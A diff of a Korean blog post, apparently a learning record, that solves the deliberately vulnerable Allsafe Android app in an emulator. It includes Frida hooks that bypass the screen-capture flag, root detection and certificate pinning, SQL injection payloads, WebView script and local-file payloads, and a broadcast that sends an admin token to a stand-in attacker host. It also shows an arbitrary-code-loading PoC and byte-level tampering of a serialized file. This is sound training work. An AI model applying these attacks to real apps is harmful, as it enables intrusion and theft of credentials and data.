@@ -5,7 +5,7 @@ date: 2026-08-31 09:00:00 +0900
 category: 안드로이드
 author: WTCY
 tags: [Android, AndroidSecurity, 모바일보안, Allsafe, Frida, jadx, apktool, 정적분석, 동적분석, 취약점재현, 학습기록]
-excerpt: "안드로이드 공부하다가 yd1ng님이 링크를 줘서 Allsafe라는 연습용 취약 앱을 처음부터 끝까지 풀어봤습니다. 로그 유출·하드코딩 자격증명부터 exported 컴포넌트, ContentProvider SQL 인젝션, WebView 로컬 파일 읽기, 네이티브 라이브러리 역산, DexClassLoader 임의코드 실행, 직렬화 객체 위변조까지 에뮬레이터에서 하나하나 재현하며 화면과 로그로 확인한 기록입니다. 잘 된 것만이 아니라 처음에 막힌 것, 요즘 안드로이드에선 아예 안 되던 것까지 그대로 적었습니다."
+excerpt: "안드로이드 공부하다가 yd1ng님이 링크를 줘서 Allsafe라는 연습용 취약 앱을 처음부터 끝까지 풀어봤습니다. 로그 유출·하드코딩 자격증명부터 exported 컴포넌트, ContentProvider SQL 인젝션, WebView 로컬 파일 읽기, 네이티브 라이브러리 역산, DexClassLoader 임의코드 실행, 직렬화 객체 위변조까지 에뮬레이터에서 하나하나 직접 시도하며 화면과 로그로 확인한 기록입니다. 잘 된 것만이 아니라 처음에 막힌 것, 요즘 안드로이드에선 아예 안 되던 것까지 그대로 적었습니다."
 ---
 
 > 대상: [t0thkr1s/allsafe](https://github.com/t0thkr1s/allsafe) — 교육용으로 만들어진 의도적 취약 안드로이드 앱 (v1.6)
@@ -45,7 +45,7 @@ window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
 이걸 먼저 풀지 않으면 이후 어떤 화면도 증거로 못 남깁니다. 마침 이게 뒤에 나올 챌린지 중 하나라서,
 이왕 이렇게 된 김에 이 문제부터 같이 풀기로 했습니다. 처음엔 이미 떠 있는 창에 `clearFlags`를
 호출해봤는데 소용이 없었습니다. 이미 secure로 만들어진 창은 되돌릴 수 없더라고요. 그래서 앱이 뜨기
-전(spawn 시점)에 `setFlags` 자체를 후킹해서 `FLAG_SECURE`(0x2000) 비트만 벗겨냈습니다.
+전(spawn 시점)에 `setFlags` 자체를 후킹해서 `FLAG_SECURE`(0x2000) 비트만 벗겨내는 쪽으로 갔습니다.
 
 ```javascript
 // bypass_secureflag.js — spawn 시 주입
@@ -67,9 +67,9 @@ $ frida -U -f infosecadventures.allsafe -l bypass_secureflag.js
 [SecureFlagBypass] setFlags(8192,8192) -> stripped FLAG_SECURE -> (0,0)
 ```
 
-훅이 걸리자마자 같은 `screencap`이 까만 23KB에서 정상 103KB로 바뀌었습니다. 이 후킹 하나가 챌린지
-"Secure Flag Bypass"의 정답이면서, 동시에 이후 모든 화면 캡처의 전제 조건이 됐습니다. 아래 홈 화면이
-그 첫 증거입니다.
+훅을 걸고 나서 같은 `screencap`을 다시 찍었더니 까만 23KB에서 정상 103KB로 바뀌었습니다. 이 후킹
+하나가 챌린지 "Secure Flag Bypass"의 정답이면서, 동시에 이후 모든 화면 캡처의 전제 조건이 됐습니다.
+아래 홈 화면이 그 첫 증거입니다.
 
 ![Frida 로 FLAG_SECURE 를 벗긴 뒤 정상적으로 캡처된 Allsafe 홈 화면 — 이전에는 같은 명령이 검은 화면만 반환했습니다](/assets/img/allsafe-android/allsafe-home.png)
 
@@ -97,7 +97,9 @@ $ frida -U -f infosecadventures.allsafe -l bypass_secureflag.js
 Log.d("ALLSAFE", "User entered secret: " + secret.getText().toString());
 ```
 
-필드에 값을 입력하고 키보드 완료(IME_ACTION_DONE)를 누른 뒤 logcat을 봤습니다.
+필드에 값을 하나 넣고 logcat을 봤는데, 처음엔 아무것도 안 찍혀서 잠깐 헤맸습니다. 알고 보니 그냥
+엔터로는 안 되고 키보드의 완료(IME_ACTION_DONE) 버튼을 눌러야 로그가 나가더라고요. 완료를 누르고
+다시 로그를 확인했습니다.
 
 ```
 $ adb logcat -d -s ALLSAFE:D
@@ -113,8 +115,8 @@ D ALLSAFE : User entered secret: hunter2_MySecretPassword
 ### 1-2. Hardcoded Credentials
 
 이 모듈은 안내문이 대놓고 "이 프래그먼트에 하드코딩된 username:password 조합이 2개 있다"고 알려
-줍니다. 저는 소스를 보는 대신, 실제로 하듯이 설치된 APK를 리버싱해서 찾기로 했습니다. base.apk를 당겨
-dex랑 리소스를 뒤졌습니다.
+줍니다. 저는 소스를 보는 대신 실제로 하듯이 설치된 APK를 리버싱해서 찾아보기로 했습니다. base.apk를
+당겨서 dex랑 리소스를 뒤졌습니다.
 
 ```
 # SOAP 요청 본문에 박힌 관리자 계정 (classes4.dex)
@@ -136,7 +138,8 @@ admin:password123@dev.infosecadventures.com
 
 ### 1-3. Insecure Shared Preferences
 
-회원가입 폼에 값을 넣으면 SharedPreferences에 암호화 없이 저장됩니다.
+이건 저장이 어떻게 되는지 직접 만들어 보고 열어 봤습니다. 회원가입 폼에 계정을 하나 대충 등록하니
+SharedPreferences에 값이 저장되는데, 코드를 보면 암호화 없이 그냥 문자열로 넣습니다.
 
 ```java
 editor.putString("username", username.getText().toString());
@@ -144,8 +147,9 @@ editor.putString("password", password.getText().toString());
 editor.apply();
 ```
 
-이 앱은 디버그 가능(`android:debuggable="true"`)하게 빌드돼 있어서 `run-as`로 앱 내부 저장소를 그냥
-읽을 수 있었습니다. 루팅 기기나 백업에서도 똑같이 열립니다.
+이 앱은 디버그 가능(`android:debuggable="true"`)하게 빌드돼 있어서, `run-as`로 앱 내부 저장소를 그냥
+열어 봤습니다. (여담으로, 입력 필드가 화면을 옮겼다 와도 값을 기억하고 있어서 처음엔 비밀번호가 두
+번 겹쳐 들어가는 바람에 몇 번 다시 등록했습니다.)
 
 ```xml
 $ run-as infosecadventures.allsafe cat .../shared_prefs/user.xml
@@ -155,8 +159,9 @@ $ run-as infosecadventures.allsafe cat .../shared_prefs/user.xml
 </map>
 ```
 
-방금 등록한 비밀번호가 XML에 평문으로 남아 있습니다. 민감 정보는 `EncryptedSharedPreferences`
-(Keystore 기반)로 보호해야 합니다. 평문 prefs는 기기에 접근할 수 있는 누구에게나 열린 파일입니다.
+방금 등록한 비밀번호가 XML에 평문으로 남아 있었습니다. 루팅 기기나 백업에서도 똑같이 열립니다. 민감
+정보는 `EncryptedSharedPreferences`(Keystore 기반)로 보호해야 합니다. 평문 prefs는 기기에 접근할 수
+있는 누구에게나 열린 파일입니다.
 
 ### 1-4. Weak Cryptography
 
@@ -205,13 +210,14 @@ my-deepest-secret
 
 ### 2-1. PIN Bypass
 
-`checkPin`은 입력값을 base64로 인코딩된 상수와 비교합니다.
+문제 설명이 Frida로 반환값을 덮어쓰라길래 처음엔 훅을 준비하려 했는데, 코드를 열어 보니 그럴 필요가
+없었습니다. `checkPin`이 입력값을 base64로 인코딩된 상수랑 그냥 비교하고 있었거든요.
 
 ```kotlin
 return pin == String(android.util.Base64.decode("NDg2Mw==", android.util.Base64.DEFAULT))
 ```
 
-Frida로 반환을 뒤집을 필요도 없었습니다. 상수만 디코드하면 정답이 그대로 나옵니다.
+상수만 디코드하면 정답이 그대로 나옵니다.
 
 ```
 $ echo NDg2Mw== | base64 -d
@@ -231,12 +237,12 @@ $ echo NDg2Mw== | base64 -d
 if (RootBeer(context).isRooted) { "rooted!" } else { "not detected" }
 ```
 
-그런데 여기서 예상 밖의 일이 있었습니다. 제 깨끗한 에뮬레이터는 RootBeer가 루팅으로 잡지 않았습니다.
-아무것도 안 건드렸는데 "not detected"가 떴습니다. 파고들어 보니 빌드 태그가 `test-keys`가 아니라
-`dev-keys`이고, `/system/xbin/su`는 있긴 한데 SELinux 때문에 앱 프로세스(untrusted_app)에서는 `stat`도
-막혀 보이지 않기 때문이었습니다.
+그런데 여기서 예상 밖의 일이 있었습니다. 우회를 해보려고 버튼부터 눌러 봤는데, 제 깨끗한
+에뮬레이터는 아무것도 안 건드렸는데도 "not detected"가 떴습니다. 왜 그런가 파고들어 보니 빌드 태그가
+`test-keys`가 아니라 `dev-keys`이고, `/system/xbin/su`는 있긴 한데 SELinux 때문에 앱
+프로세스(untrusted_app)에서는 `stat`도 막혀서 안 보이기 때문이었습니다.
 
-그래서 챌린지 의도(Frida 연습)를 제대로 보이려고 `isRooted`의 반환을 양쪽으로 조종해봤습니다.
+그래서 챌린지 의도(Frida 연습)를 제대로 보이려고, 판정 결과를 양쪽으로 다 조종해봤습니다.
 
 ```javascript
 // 탐지 시연: 강제로 true → "Sorry, your device is rooted!"
@@ -244,8 +250,8 @@ RootBeer.isRooted.implementation = function () { return true; };
 // 우회: 강제로 false → "Congrats, root is not detected!"
 ```
 
-`true`로 강제하면 로그에 `RootBeer.isRooted() -> forced TRUE`가 찍히면서 "루팅됨"으로 바뀌고,
-`false`로 강제하면 다시 "미탐지"로 돌아옵니다. 판정 자체를 후킹으로 통째로 좌우할 수 있다는 걸 두
+`true`로 강제하니 로그에 `RootBeer.isRooted() -> forced TRUE`가 찍히면서 "루팅됨"으로 바뀌고,
+`false`로 강제하니 다시 "미탐지"로 돌아왔습니다. 판정 자체를 후킹으로 통째로 좌우할 수 있다는 걸 두
 화면으로 남겼습니다. 루팅 탐지가 앱 프로세스 안에서 돌아가는 한, 그 안에 들어온 계측 도구 앞에서는
 참·거짓이 공격자 손에 있는 셈입니다. 직접 뒤집어 보니 확실히 이해됐습니다.
 
@@ -265,8 +271,8 @@ for (...) output[i] = pass[i] ^ k;
 return hardcoreEncryption(env, pass) == "8>;.98.(9.?";
 ```
 
-릴리스 .so는 스트립돼 있어서 평문 "supersecret" 문자열은 안 남았습니다(위 `p`는 안 쓰여서 컴파일러가
-지움). 대신 목표 암호문이랑 키가 남아 있으니 손으로 XOR만 되돌리면 됐습니다.
+.so를 뽑아서 문자열부터 봤는데, 릴리스라 스트립돼 있어서 평문 "supersecret"는 안 남아 있었습니다(위
+`p`는 안 쓰여서 컴파일러가 지움). 대신 목표 암호문이랑 키가 남아 있으니, 손으로 XOR만 되돌려봤습니다.
 
 ```
 $ python -c "print(''.join(chr(ord(c)^0x4B) for c in '8>;.98.(9.?'))"
@@ -301,9 +307,9 @@ apktool로 디컴파일해서 smali에서 값을 로드하는 딱 한 줄을 바
 + sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->ACTIVE:...
 ```
 
-`apktool b`로 재빌드하고 `zipalign` → `apksigner`(디버그 키)로 서명한 뒤 재설치했습니다. 원본과 서명이
-달라서 기존 앱을 지우고 패치본을 새로 깔아야 했는데, 다시 실행해서 버튼을 누르니 흐름이 바뀐 게 바로
-보였습니다.
+그다음 `apktool b`로 다시 빌드하고 `zipalign` → `apksigner`(디버그 키)로 서명한 뒤 재설치했습니다.
+원본과 서명이 달라서 기존 앱을 지우고 패치본을 새로 깔아야 했는데, 다시 실행해서 버튼을 누르니 흐름이
+바뀐 게 바로 보였습니다.
 
 ![Smali Patch — INACTIVE 를 ACTIVE 로 패치·재서명한 APK 에서 "Firewall is now activated, good job!"](/assets/img/allsafe-android/c11-smali-patch.png)
 
@@ -315,8 +321,8 @@ apktool로 디컴파일해서 smali에서 값을 로드하는 딱 한 줄을 바
 ## 3. exported 컴포넌트
 
 `AndroidManifest.xml`에서 `android:exported="true"`로 열려 있는 컴포넌트는 다른 앱(또는 adb)이 직접
-호출할 수 있습니다. Allsafe는 리시버·서비스·프로바이더·프록시 액티비티를 죄다 열어 놨길래, 이 묶음은
-대부분 UI를 거치지 않고 `adb`로 바로 찔러 봤습니다.
+호출할 수 있습니다. 저는 매니페스트부터 훑어서 열려 있는 리시버·서비스·프로바이더를 추린 다음, 대부분
+UI를 거치지 않고 `adb`로 바로 찔러 봤습니다.
 
 ### 3-1. Insecure Broadcast Receiver
 
@@ -328,7 +334,8 @@ apktool로 디컴파일해서 smali에서 값을 로드하는 딱 한 줄을 바
 .addQueryParameter("auth_token", "YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4=")
 ```
 
-외부에서 브로드캐스트를 쏴 봤습니다.
+그래서 공격자 서버를 `attacker.wtcy.test`라고 가짜로 정해 두고, 밖에서 브로드캐스트를 한 방 쏴
+봤습니다.
 
 ```
 $ am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE \
@@ -342,21 +349,21 @@ $ echo YWxsc2FmZV9kZXZfYWRtaW5fdG9rZW4= | base64 -d
 allsafe_dev_admin_token
 ```
 
-권한 하나 없는 제 명령이 Allsafe를 시켜서 하드코딩된 관리자 토큰을 제가 지정한 호스트로 보내게
+권한 하나 없는 제 명령이 Allsafe를 시켜서, 하드코딩된 관리자 토큰을 제가 지정한 호스트로 보내게
 만들었습니다(SSRF + 비밀 유출). exported 리시버는 서명 권한으로 보호하거나 내부 전용으로 닫아야
 한다는 걸 실제 URL로 확인했습니다.
 
 ### 3-2. Deep Link Exploitation
 
 `DeepLinkTask`가 `allsafe://infosecadventures/congrats` 스킴을 처리하고, 쿼리 `key`를 `R.string.key`랑
-비교합니다. 그 key는 리소스에 그대로 있었습니다(`ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`).
+비교합니다. 그래서 리소스부터 열어 봤더니 key가 그대로 있었습니다(`ebfb7ff0-b2f6-41c8-bef3-4fba17be410c`).
 
 ```
 $ am start -a android.intent.action.VIEW \
     -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
 ```
 
-정답 key로 딥링크를 여니 잠긴 화면이 풀렸습니다.
+그 key를 딥링크에 실어 여니 잠긴 화면이 풀렸습니다.
 
 ![Deep Link — 리소스에서 추출한 key 로 딥링크를 열자 "Good job, you did it!"](/assets/img/allsafe-android/c08-deeplink.png)
 
@@ -365,8 +372,8 @@ $ am start -a android.intent.action.VIEW \
 
 ### 3-3. Insecure Service
 
-`RecorderService`가 exported라, 다른 앱이 서비스를 시작하는 것만으로 마이크 녹음이 돌아갑니다. 이건
-좀 섬뜩했습니다.
+`RecorderService`가 exported라, 저는 서비스만 한 번 시작해 봤습니다. 그런데 그것만으로 마이크 녹음이
+돌아가더라고요. 이건 좀 섬뜩했습니다.
 
 ```
 $ am startservice -n infosecadventures.allsafe/.challenges.RecorderService
@@ -387,7 +394,7 @@ queryBuilder.setTables("note");
 return queryBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder);
 ```
 
-권한이 없어도 노트 테이블이 통째로 열렸습니다.
+저는 별다른 권한 없이 `content query`로 그냥 긁어 봤는데, 노트 테이블이 통째로 열렸습니다.
 
 ```
 $ content query --uri content://infosecadventures.allsafe.dataprovider/note
@@ -395,7 +402,7 @@ Row: 0 user=admin, note=I can not believe that Jill is still using 123456 as her
 Row: 1 user=elliot.alderson, note=...
 ```
 
-여기서 멈추지 않고 projection에 SQL을 주입해 봤더니 임의 스키마까지 읽혔습니다.
+여기서 멈추지 않고 projection에 SQL을 슬쩍 주입해 봤더니 임의 스키마까지 읽혔습니다.
 
 ```
 $ content query --uri content://.../note --projection "name FROM sqlite_master WHERE type=\"table\"--"
@@ -433,8 +440,8 @@ db.rawQuery("select * from user where username = '" + username + "' and password
 ```
 
 username에 `'or'1'='1'--`를 넣으면 비밀번호 조건이 주석 처리되면서 조건이 항상 참이 돼서 사용자
-테이블이 덤프됩니다. 참고로 이 페이로드를 `adb`로 넣을 때 작은따옴표가 자꾸 셸에서 사라져서 한동안
-왜 안 되나 헤맸습니다. 결국 이스케이프를 맞춰 주고서야 들어갔습니다.
+테이블이 덤프됩니다. 그런데 이 페이로드를 `adb`로 넣을 때 작은따옴표가 자꾸 셸에서 사라져서 한동안
+왜 안 되나 헤맸습니다. 결국 이스케이프를 맞춰 주고서야 제대로 들어갔습니다.
 
 ```
 입력: username = 'or'1'='1'--   password = (비움)
@@ -455,7 +462,7 @@ settings.setJavaScriptEnabled(true);
 settings.setAllowFileAccess(true);
 ```
 
-입력이 유효 URL이 아니면 `loadData`, 유효 URL이면 `loadUrl`로 처리하는데, 두 경로 다 위험했습니다.
+입력이 유효 URL이 아니면 `loadData`, 유효 URL이면 `loadUrl`로 처리하길래 두 경로를 다 찔러 봤습니다.
 `<script>alert(1337)</script>`를 넣으면 WebView 안에서 임의 자바스크립트가 실행되고, `file:///etc/hosts`를
 넣으면 기기의 로컬 파일이 WebView에 그대로 렌더됩니다. 사실 처음 alert을 넣었을 땐 안 떠서 loadData가
 막힌 줄 알았는데, 화면 레이아웃이 밀려서 실행 버튼을 잘못 누른 거였습니다. 좌표를 다시 맞추니 바로
@@ -479,7 +486,7 @@ settings.setAllowFileAccess(true);
 
 Firebase 실시간 DB에서 `secret` 노드를 읽는 모듈입니다. `google-services.json`에 DB URL이 그대로
 있어서(`https://allsafe-8cef0.firebaseio.com`), 규칙이 공개(public read)면 앱을 거치지 않고 REST로 바로
-읽힙니다. 그래서 앱이 읽는 `secret` 대신 루트 경로를 찔러 봤습니다.
+읽힐 것 같았습니다. 그래서 앱이 읽는 `secret` 대신, 아예 루트 경로를 한번 찔러 봤습니다.
 
 ```
 $ curl -s https://allsafe-8cef0.firebaseio.com/.json
@@ -494,8 +501,8 @@ $ curl -s https://allsafe-8cef0.firebaseio.com/.json
 
 ### 5-2. Insecure Providers (Firebase Storage)
 
-이 모듈은 하드코딩된 `gs://allsafe-8cef0.appspot.com/readme.txt`를 인증 없이 내려받습니다. 구조적
-취약점은 "공개 스토리지 버킷을 URL만으로 다운로드"인데, 라이브 재현은 막혔습니다.
+이 모듈은 하드코딩된 `gs://allsafe-8cef0.appspot.com/readme.txt`를 인증 없이 내려받습니다. 저도 앱을
+거치지 않고 그 버킷 URL로 파일을 직접 받아보려 했는데, 여기선 막혔습니다.
 
 ```
 $ curl -s "https://firebasestorage.googleapis.com/v0/b/allsafe-8cef0.appspot.com/o/readme.txt?alt=media"
@@ -504,7 +511,7 @@ $ curl -s "https://firebasestorage.googleapis.com/v0/b/allsafe-8cef0.appspot.com
 
 버킷이 취약해서가 아니라, 구글이 2024년 9월에 무료(Spark) 요금제의 Storage 접근을 회수해서 백엔드
 자체가 402를 반환합니다. 코드랑 설정(gs URL·api_key)으로 취약 구조는 확인되지만, 정책 변경 때문에
-실제 다운로드는 안 됐습니다. 되는 척하지 않고 있는 그대로 적습니다.
+실제 다운로드까지는 못 갔습니다. 되는 척하지 않고 있는 그대로 적습니다.
 
 ---
 
@@ -527,20 +534,21 @@ createPackageContext(pkg, CONTEXT_INCLUDE_CODE or CONTEXT_IGNORE_SECURITY)
 // (B) /sdcard/Download/allsafe_updater.apk 를 DexClassLoader 로 로드
 ```
 
-저는 처음에 (B) 벡터부터 시도했습니다. `/sdcard/Download/`에 dex를 심으면 되겠거니 했는데, 계속
-아무 일도 안 일어났습니다. 파고들어 보니 이 앱의 `targetSdk`가 35라 scoped storage가 강제되고,
-`requestLegacyExternalStorage`는 무시됩니다. 그래서 앱이 자기가 만들지 않은
+저는 처음에 (B) 벡터부터 시도했습니다. `/sdcard/Download/`에 dex를 심으면 되겠거니 하고 올려 뒀는데,
+앱을 재시작해도 계속 아무 일도 안 일어났습니다. 왜 그런가 파고들어 보니 이 앱의 `targetSdk`가 35라
+scoped storage가 강제되고 `requestLegacyExternalStorage`는 무시됩니다. 그래서 앱이 자기가 만들지 않은
 `/sdcard/Download/allsafe_updater.apk`를 읽으려 하면 `Permission denied`로 막혀서 로딩 자체가 안
 일어났습니다. 이 벡터는 요즘 안드로이드에서 사실상 죽어 있었습니다(API 29 이하에서나 유효). 코드엔
-있는데 지금 기기에선 안 되는 딱 그 경우였습니다.
+있는데 지금 기기에선 안 되는, 딱 그 경우였습니다.
 
 그래서 (A) 벡터로 방향을 틀었습니다. 이쪽은 저장소랑 무관하게 살아 있었습니다. 패키지명이
-`infosecadventures.allsafe.`로 시작하는 앱을 하나 만들고, 그 안에 `infosecadventures.allsafe.plugin.Loader.loadPlugin()`을
-심으면, Allsafe가 시작될 때 그 코드를 자기 프로세스로 끌어와 실행합니다. 오버시큐어드가 정리한
-"서드파티 패키지 컨텍스트를 통한 임의코드 실행" 기법입니다.
+`infosecadventures.allsafe.`로 시작하는 앱을 하나 직접 만들고, 그 안에 `infosecadventures.allsafe.plugin.Loader.loadPlugin()`을
+심었습니다. 그랬더니 Allsafe가 시작될 때 그 코드를 자기 프로세스로 끌어와 실행하더라고요. 오버시큐어드가
+정리한 "서드파티 패키지 컨텍스트를 통한 임의코드 실행" 기법입니다.
 
-PoC 앱(`infosecadventures.allsafe.poc`)의 `loadPlugin()`이 Allsafe의 Application 컨텍스트를 리플렉션으로
-얻어서, 호스트의 프라이빗 내부 저장소에 파일을 쓰게 했습니다. 그 UID로만 가능한 동작입니다.
+증거를 남기려고, PoC 앱(`infosecadventures.allsafe.poc`)의 `loadPlugin()`이 Allsafe의 Application 컨텍스트를
+리플렉션으로 얻어서 호스트의 프라이빗 내부 저장소에 파일을 쓰게 만들었습니다. 그 UID로만 가능한
+동작이라 확실한 증거가 됩니다.
 
 ```
 # Allsafe 재시작 후 logcat
@@ -570,12 +578,12 @@ attacker=infosecadventures.allsafe.poc  host_pkg=infosecadventures.allsafe  uid=
 if (!user.role.equals("ROLE_EDITOR")) { "only editors" } else { "Good job!" }
 ```
 
-외부 저장소의 직렬화 파일은 손댈 수 있습니다. `ROLE_AUTHOR`랑 `ROLE_EDITOR`가 둘 다 11바이트라,
-직렬화 스트림의 길이 프리픽스를 건드리지 않고 제자리에서 바이트만 바꿔도 권한을 올릴 수 있겠다
-싶었습니다. 그런데 여기서 한참 헤맸습니다. `adb push`로 파일을 덮으니 소유자가 바뀌어서 앱이 못
-읽더라고요(EACCES, scoped storage/FUSE). 소유권을 복구하려고 chown도 해봤는데 FUSE라 소용없었습니다.
-결국 파일을 새로 만들지 않고, root `dd`로 오프셋 153의 11바이트만 제자리에서 덮어써서 소유권을
-살리는 방법으로 풀었습니다.
+외부 저장소의 직렬화 파일은 손댈 수 있으니, 저장된 `user.dat`를 열어서 `role`만 바꿔 보기로 했습니다.
+`ROLE_AUTHOR`랑 `ROLE_EDITOR`가 둘 다 11바이트라, 직렬화 스트림의 길이 프리픽스를 건드리지 않고
+제자리에서 바이트만 바꿔도 되겠다 싶었습니다. 그런데 여기서 한참 헤맸습니다. `adb push`로 파일을
+덮으니 소유자가 바뀌어서 앱이 못 읽더라고요(EACCES, scoped storage/FUSE). 소유권을 복구하려고
+chown도 해봤는데 FUSE라 소용없었습니다. 결국 파일을 새로 만들지 않고, root `dd`로 오프셋 153의
+11바이트만 제자리에서 덮어써서 소유권을 살리는 방법으로 풀었습니다.
 
 ```
 $ su 0 sh -c "printf 'ROLE_EDITOR' | dd of=.../user.dat bs=1 seek=153 conv=notrunc"
@@ -604,7 +612,7 @@ D ALLSAFE : sha256/G+QSw0qJuwUD7UqjInOR+MY5s8BVHgu1BuxjH6UvFx8=   # 실서버 �
 Snackbar: Successful connection over HTTPS!
 ```
 
-Frida로 `CertificatePinner.check` / `check$okhttp`를 무력화하는 훅을 넣어 두긴 했지만, 여기선 솔직하게
+저도 Frida로 `CertificatePinner.check` / `check$okhttp`를 무력화하는 훅을 넣어 봤지만, 여기선 솔직하게
 적겠습니다. 피닝 우회의 진짜 목적은 가로채기 프록시(Burp/mitmproxy)의 CA를 앱이 받아들이게 만드는
 겁니다. 프록시를 안 세운 이 환경에서는 핀 검증을 건너뛰게 만든 것까지는 계측으로 보였지만,
 클리어텍스트 트래픽을 실제로 가로채 보여 주는 단계는 프록시랑 CA 설치가 있어야 합니다. 게다가 릴리스
@@ -618,18 +626,23 @@ R8 빌드라 내부 핀검증 호출 경로가 훅 시그니처랑 어긋나는 
 
 ## 마치며
 
-전부 풀고 나서 남은 교훈은 하나로 모였습니다. 기기 안에 있는 건 뭐든 비밀이 아니고, 밖에서 들어오는
-건 뭐든 믿을 수 없다는 겁니다. 로그·prefs·리소스·dex·네이티브 문자열은 전부 뽑혔고, 클라이언트
-판정(PIN·루트·네이티브·방화벽)은 정적 추출이나 동적 후킹으로 뒤집혔으며, exported 컴포넌트랑 검증 없는
-입력(SQL·WebView·직렬화·패키지 컨텍스트)은 곧장 공격 표면이 됐습니다.
+전부 풀고 나니 결국 한 문장으로 정리되더라고요. 기기 안에 있는 건 뭐든 비밀이 아니고, 밖에서
+들어오는 건 뭐든 믿을 수 없다는 겁니다. 로그·prefs·리소스·dex·네이티브 문자열은 전부 뽑혔고,
+클라이언트 판정(PIN·루트·네이티브·방화벽)은 정적 추출이나 동적 후킹으로 뒤집혔고, exported 컴포넌트랑
+검증 없는 입력(SQL·WebView·직렬화·패키지 컨텍스트)은 그대로 공격 표면이 됐습니다.
 
-그런데 이 앱을 풀면서 개인적으로 제일 많이 남은 건 되는 것보다 안 되는 것의 경계였습니다. scoped
-storage는 `/sdcard` 기반 dex 로딩 벡터를 실제로 죽였고, 요금제 정책 변경은 Firebase Storage 백엔드를
-회수했고, RootBeer는 제 깨끗한 AVD를 루팅으로 잡지 않았습니다. 취약점은 코드에 그대로 있어도
-플랫폼이랑 환경이 도달성을 바꿉니다. 그래서 앞으로도 코드에 있다는 거랑 지금 이 기기에서 실제로
-터진다는 걸 구분해서 적으려고 합니다. 이 앱이 저한테 준 제일 큰 습관입니다.
+그런데 풀면서 개인적으로 제일 많이 남은 건 되는 것보다 안 되는 것의 경계였습니다. scoped storage는
+`/sdcard` 기반 dex 로딩 벡터를 실제로 죽였고, 요금제 정책이 바뀌면서 Firebase Storage 백엔드는
+회수됐고, RootBeer는 제 깨끗한 AVD를 루팅으로 잡지도 않았습니다. 취약점이 코드에 그대로 있어도
+플랫폼이랑 환경이 도달성을 바꾼다는 걸 계속 마주쳤습니다. 그래서 앞으로도 코드에 있다는 거랑 지금 이
+기기에서 진짜 터진다는 걸 구분해서 적으려고 합니다. 이 앱이 저한테 준 제일 큰 습관인 것 같습니다.
 
-방어 쪽도 같은 얘기입니다. 비밀은 서버나 Keystore로, 판정은 서버로, 컴포넌트는 기본 닫힘으로, 입력은
-파라미터 바인딩이나 화이트리스트로, 그리고 믿을 수 없는 코드·데이터·컨텍스트는 로드하지 않기.
-하나하나는 교과서 같은 얘기지만, 이 앱은 그 교과서를 어겼을 때 실제로 무슨 일이 벌어지는지를 화면이랑
-로그로 보여 줬습니다. 다음엔 인증서 피닝을 프록시까지 세워서 끝까지 가 보고 싶습니다.
+방어 쪽도 결국 같은 얘기입니다. 비밀은 서버나 Keystore로, 판정은 서버로, 컴포넌트는 기본 닫힘으로,
+입력은 파라미터 바인딩이나 화이트리스트로, 믿을 수 없는 코드·데이터·컨텍스트는 로드하지 않기.
+하나하나는 교과서에 다 나오는 얘기인데, 이 앱은 그 교과서를 어겼을 때 실제로 뭐가 터지는지를 화면이랑
+로그로 직접 보여 줘서 훨씬 잘 남았습니다.
+
+솔직히 처음엔 그냥 문제 하나 풀어볼까 하고 가볍게 시작했는데, 하다 보니 삽질하는 것도 재밌고 "이건
+왜 안 되지?" 하고 파고드는 순간이 제일 기억에 남았습니다. 안드로이드 쪽은 아직 볼 게 많아서 더
+공부해 보고 싶습니다. 다음엔 여기서 못 끝낸 인증서 피닝을 프록시까지 세워서 트래픽 가로채기까지 가
+볼 생각입니다. 긴 글 여기까지 읽어 주셔서 감사합니다.
